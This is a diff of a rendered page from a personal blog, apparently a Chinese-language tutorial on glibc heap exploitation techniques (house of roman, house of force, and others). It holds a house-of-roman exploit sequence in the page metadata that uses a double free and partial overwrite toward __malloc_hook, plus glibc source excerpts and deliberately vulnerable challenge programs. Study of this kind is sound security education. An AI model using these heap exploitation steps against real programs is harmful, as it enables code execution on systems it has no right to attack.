@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html lang="en-us" dir="ltr">
+<html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="house of 系列 house of roman 这个主要是利用方法就是通过unsorted bin 的fd 的低两字节对glibc上的某个结构进行要给1/16的一个覆盖爆破这里我们要对这个攻击方式进行一个学习\n这里我们攻击流程和原理\n这个漏洞和我们的glibc的版本和源码无关，主要是利用pie保护的一个缺陷。\n因此我们的流程图是这样的\n这个就是整个数据结构的一个流程\n但是着我们要注意远程是否又开aslr的地址随机化。同时可以通过/proc/sys/kernel/randomize_va_space的值是可以控制的这里就要移步学习aslr相关的程序\n下面这一段就是他的一个核心代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 add_chunk(0, 0x68) add_chunk(1, 0x98) add_chunk(2, 0x68)#这个创建了三个堆块 delete_chunk(1)#这里吧chunk1给free掉是的他进入unsortbin add_chunk(3, 0x28)#这里分割出一个0x28大小的堆块，是的chunk1有0x68大小的堆使得它可以绕过fastbin的一个检查这里就要看fastbin attck add_chunk(1, 0x68) edit_chunk(1, p16(0xbaed))#这里这个数据是用来覆盖到mallod_hook的一个操作 delete_chunk(2)#double free delete_chunk(0) delete_chunk(2) add_chunk(0, 0x68) edit_chunk(0, p8(0xa0)) add_chunk(0, 0x68)#这里我们就可以指向0xa0方向的heap add_chunk(0, 0x68) add_chunk(0, 0x68) add_chunk(0, 0x68) house of force 这个攻击手法主要就是通过篡改topchunk的size为一个很大的值可以绕过对用户请求大小和topchunk现有的size进行一个验证\n">
 <title>House_of_xxx</title>
 
 <link rel='canonical' href='https://Helios973.github.io/p/house_of_xxx/'>
 
-<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="House_of_xxx">
+<link rel="stylesheet" href="/scss/style.min.d86b0d3b80ae657381126418a5f6fcced0d4e6f865af40134fee4ac2c74355d2.css"><meta property='og:title' content="House_of_xxx">
 <meta property='og:description' content="house of 系列 house of roman 这个主要是利用方法就是通过unsorted bin 的fd 的低两字节对glibc上的某个结构进行要给1/16的一个覆盖爆破这里我们要对这个攻击方式进行一个学习\n这里我们攻击流程和原理\n这个漏洞和我们的glibc的版本和源码无关，主要是利用pie保护的一个缺陷。\n因此我们的流程图是这样的\n这个就是整个数据结构的一个流程\n但是着我们要注意远程是否又开aslr的地址随机化。同时可以通过/proc/sys/kernel/randomize_va_space的值是可以控制的这里就要移步学习aslr相关的程序\n下面这一段就是他的一个核心代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 add_chunk(0, 0x68) add_chunk(1, 0x98) add_chunk(2, 0x68)#这个创建了三个堆块 delete_chunk(1)#这里吧chunk1给free掉是的他进入unsortbin add_chunk(3, 0x28)#这里分割出一个0x28大小的堆块，是的chunk1有0x68大小的堆使得它可以绕过fastbin的一个检查这里就要看fastbin attck add_chunk(1, 0x68) edit_chunk(1, p16(0xbaed))#这里这个数据是用来覆盖到mallod_hook的一个操作 delete_chunk(2)#double free delete_chunk(0) delete_chunk(2) add_chunk(0, 0x68) edit_chunk(0, p8(0xa0)) add_chunk(0, 0x68)#这里我们就可以指向0xa0方向的heap add_chunk(0, 0x68) add_chunk(0, 0x68) add_chunk(0, 0x68) house of force 这个攻击手法主要就是通过篡改topchunk的size为一个很大的值可以绕过对用户请求大小和topchunk现有的size进行一个验证\n">
 <meta property='og:url' content='https://Helios973.github.io/p/house_of_xxx/'>
 <meta property='og:site_name' content='helios'>
@@ -458,10 +458,10 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 获取当前的top chunk，并计算其对应的大小
-</span></span></span><span class="line"><span class="cl"><span class="n">victim</span> <span class="o">=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">victim</span> <span class="o">=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="n">size</span> <span class="o">=</span> <span class="nf">chunksize</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="c1">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
-</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span> <span class="o">+</span> <span class="n">MINSIZE</span><span class="p">))</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span> <span class="o">+</span> <span class="n">MINSIZE</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="n">remainder_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="n">nb</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">remainder</span> <span class="o">=</span> <span class="nf">chunk_at_offset</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
@@ -577,7 +577,7 @@
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">chunk_list</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">menu</span><span class="p">()</span> <span class="p">{</span>
@@ -674,7 +674,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="nv">VERSION</span><span class="o">=</span>2.27
 </span></span><span class="line"><span class="cl"><span class="nv">LIBC_NAME</span><span class="o">=</span>libc.so.6
 </span></span><span class="line"><span class="cl"><span class="nv">LD_NAME</span><span class="o">=</span>ld-linux-x86-64.so.2
@@ -932,9 +932,9 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define MINSIZE \
 </span></span></span><span class="line"><span class="cl"><span class="cp">	(unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;
-</span></span></span><span class="line"><span class="cl"><span class="o">~</span><span class="n">MALLOC_ALIGN_MASK</span><span class="p">))</span>
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="o">~</span><span class="n">MALLOC_ALIGN_MASK</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#define aligned_OK(m) (((unsigned long) (m) &amp;MALLOC_ALIGN_MASK) == 0)
-</span></span></span><span class="line"><span class="cl">	<span class="cm">/* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */</span>
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="cm">/* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */</span>
 </span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span><span class="p">(</span><span class="n">size</span> <span class="o">&lt;</span> <span class="n">MINSIZE</span> <span class="o">||</span> <span class="o">!</span><span class="nf">aligned_OK</span><span class="p">(</span><span class="n">size</span><span class="p">)))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="n">errstr</span> <span class="o">=</span> <span class="s">&#34;free(): invalid size&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">errout</span><span class="p">;</span>
@@ -1100,7 +1100,7 @@
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">chunk_list</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">menu</span><span class="p">()</span> <span class="p">{</span>
@@ -1560,7 +1560,7 @@
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">chunk_list</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">menu</span><span class="p">()</span> <span class="p">{</span>
@@ -1821,11 +1821,11 @@
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">chunk_list</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="cp">#define puts(str) write(1, str, strlen(str)), write(1, &#34;\n&#34;, 1)
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">menu</span><span class="p">()</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1. add chunk&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;2. delete chunk&#34;</span><span class="p">);</span>
@@ -2591,16 +2591,16 @@
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;shlib-compat.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">ssize_t</span>
 </span></span><span class="line"><span class="cl"><span class="nf">_IO_cookie_read</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">ssize_t</span> <span class="n">size</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_IO_cookie_file</span> <span class="o">*</span><span class="n">cfile</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_IO_cookie_file</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">cookie_read_function_t</span> <span class="o">*</span><span class="n">read_cb</span> <span class="o">=</span> <span class="n">cfile</span><span class="o">-&gt;</span><span class="n">__io_functions</span><span class="p">.</span><span class="n">read</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#ifdef PTR_DEMANGLE
-</span></span></span><span class="line"><span class="cl">  <span class="nf">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">read_cb</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="nf">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">read_cb</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#endif
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">read_cb</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
@@ -2613,9 +2613,9 @@
 </span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_IO_cookie_file</span> <span class="o">*</span><span class="n">cfile</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_IO_cookie_file</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">cookie_write_function_t</span> <span class="o">*</span><span class="n">write_cb</span> <span class="o">=</span> <span class="n">cfile</span><span class="o">-&gt;</span><span class="n">__io_functions</span><span class="p">.</span><span class="n">write</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#ifdef PTR_DEMANGLE
-</span></span></span><span class="line"><span class="cl">  <span class="nf">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">write_cb</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="nf">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">write_cb</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#endif
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">write_cb</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="p">{</span>
 </span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
@@ -2635,9 +2635,9 @@
 </span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_IO_cookie_file</span> <span class="o">*</span><span class="n">cfile</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_IO_cookie_file</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">cookie_seek_function_t</span> <span class="o">*</span><span class="n">seek_cb</span> <span class="o">=</span> <span class="n">cfile</span><span class="o">-&gt;</span><span class="n">__io_functions</span><span class="p">.</span><span class="n">seek</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#ifdef PTR_DEMANGLE
-</span></span></span><span class="line"><span class="cl">  <span class="nf">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">seek_cb</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="nf">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">seek_cb</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#endif
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">((</span><span class="n">seek_cb</span> <span class="o">==</span> <span class="nb">NULL</span>
 </span></span><span class="line"><span class="cl">	   <span class="o">||</span> <span class="p">(</span><span class="nf">seek_cb</span> <span class="p">(</span><span class="n">cfile</span><span class="o">-&gt;</span><span class="n">__cookie</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="n">dir</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">	       <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
@@ -2651,9 +2651,9 @@
 </span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_IO_cookie_file</span> <span class="o">*</span><span class="n">cfile</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_IO_cookie_file</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">cookie_close_function_t</span> <span class="o">*</span><span class="n">close_cb</span> <span class="o">=</span> <span class="n">cfile</span><span class="o">-&gt;</span><span class="n">__io_functions</span><span class="p">.</span><span class="n">close</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#ifdef PTR_DEMANGLE
-</span></span></span><span class="line"><span class="cl">  <span class="nf">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">close_cb</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="nf">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">close_cb</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#endif
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">close_cb</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
@@ -2702,12 +2702,12 @@
 </span></span><span class="line"><span class="cl">	       <span class="kt">cookie_io_functions_t</span> <span class="n">source</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#ifdef PTR_MANGLE
-</span></span></span><span class="line"><span class="cl">  <span class="nf">PTR_MANGLE</span> <span class="p">(</span><span class="n">source</span><span class="p">.</span><span class="n">read</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="nf">PTR_MANGLE</span> <span class="p">(</span><span class="n">source</span><span class="p">.</span><span class="n">read</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">PTR_MANGLE</span> <span class="p">(</span><span class="n">source</span><span class="p">.</span><span class="n">write</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">PTR_MANGLE</span> <span class="p">(</span><span class="n">source</span><span class="p">.</span><span class="n">seek</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">PTR_MANGLE</span> <span class="p">(</span><span class="n">source</span><span class="p">.</span><span class="n">close</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#endif
-</span></span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="n">source</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="n">source</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span>
@@ -2743,9 +2743,9 @@
 </span></span><span class="line"><span class="cl">  <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">_IO_cookie_file</span> <span class="n">cfile</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#ifdef _IO_MTSAFE_IO
-</span></span></span><span class="line"><span class="cl">    <span class="n">_IO_lock_t</span> <span class="n">lock</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">_IO_lock_t</span> <span class="n">lock</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#endif
-</span></span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="o">*</span><span class="n">new_f</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="p">}</span> <span class="o">*</span><span class="n">new_f</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="k">switch</span> <span class="p">(</span><span class="o">*</span><span class="n">mode</span><span class="o">++</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="p">{</span>
@@ -2769,9 +2769,9 @@
 </span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">new_f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#ifdef _IO_MTSAFE_IO
-</span></span></span><span class="line"><span class="cl">  <span class="n">new_f</span><span class="o">-&gt;</span><span class="n">cfile</span><span class="p">.</span><span class="n">__fp</span><span class="p">.</span><span class="n">file</span><span class="p">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="n">new_f</span><span class="o">-&gt;</span><span class="n">cfile</span><span class="p">.</span><span class="n">__fp</span><span class="p">.</span><span class="n">file</span><span class="p">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#endif
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl">  <span class="nf">_IO_cookie_init</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">cfile</span><span class="p">,</span> <span class="n">read_write</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">io_functions</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">cfile</span><span class="p">.</span><span class="n">__fp</span><span class="p">;</span>
@@ -2780,7 +2780,7 @@
 </span></span><span class="line"><span class="cl"><span class="nf">versioned_symbol</span> <span class="p">(</span><span class="n">libc</span><span class="p">,</span> <span class="n">_IO_fopencookie</span><span class="p">,</span> <span class="n">fopencookie</span><span class="p">,</span> <span class="n">GLIBC_2_2</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="cp">#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_2)
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">off64_t</span>
 </span></span><span class="line"><span class="cl"><span class="n">attribute_compat_text_section</span>
 </span></span><span class="line"><span class="cl"><span class="nf">_IO_old_cookie_seek</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">off64_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dir</span><span class="p">)</span>
@@ -2789,9 +2789,9 @@
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">seek_cb</span><span class="p">)</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">,</span> <span class="kt">off_t</span><span class="p">,</span> <span class="kt">int</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">,</span> <span class="kt">off_t</span><span class="p">,</span> <span class="kt">int</span><span class="p">))</span> <span class="n">cfile</span><span class="o">-&gt;</span><span class="n">__io_functions</span><span class="p">.</span><span class="n">seek</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#ifdef PTR_DEMANGLE
-</span></span></span><span class="line"><span class="cl">  <span class="nf">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">seek_cb</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="nf">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">seek_cb</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#endif
-</span></span></span><span class="line"><span class="cl">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">seek_cb</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
@@ -2868,12 +2868,12 @@
 </span></span><span class="line"><span class="cl">		 <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">function</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="nf">__fxprintf</span> <span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">&#34;%s%s%s:%u: %s%sAssertion `%s&#39; failed.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="c1">//这个是emma调用的位置
-</span></span></span><span class="line"><span class="cl">		     <span class="n">__progname</span><span class="p">,</span> <span class="n">__progname</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">?</span> <span class="s">&#34;: &#34;</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="p">,</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		     <span class="n">__progname</span><span class="p">,</span> <span class="n">__progname</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">?</span> <span class="s">&#34;: &#34;</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">		     <span class="n">file</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">		     <span class="n">function</span> <span class="o">?</span> <span class="nl">function</span> <span class="p">:</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">function</span> <span class="o">?</span> <span class="s">&#34;: &#34;</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">		     <span class="n">assertion</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">fflush</span> <span class="p">(</span><span class="n">stderr</span><span class="p">);</span><span class="c1">//这个位置是kiwi的调用位置
-</span></span></span><span class="line"><span class="cl">  <span class="nf">abort</span> <span class="p">();</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">abort</span> <span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
@@ -3014,6 +3014,15 @@
 
         document.head.appendChild(customFont);
     }());
+</script>
+<script src="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.js" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.css" crossorigin="anonymous" />
+<script>
+    NProgress.start();
+    document.addEventListener("readystatechange", () => {
+        if (document.readyState === "interactive") NProgress.inc(0.8);
+        if (document.readyState === "complete") NProgress.done();
+    });
 </script>
 
     </body>
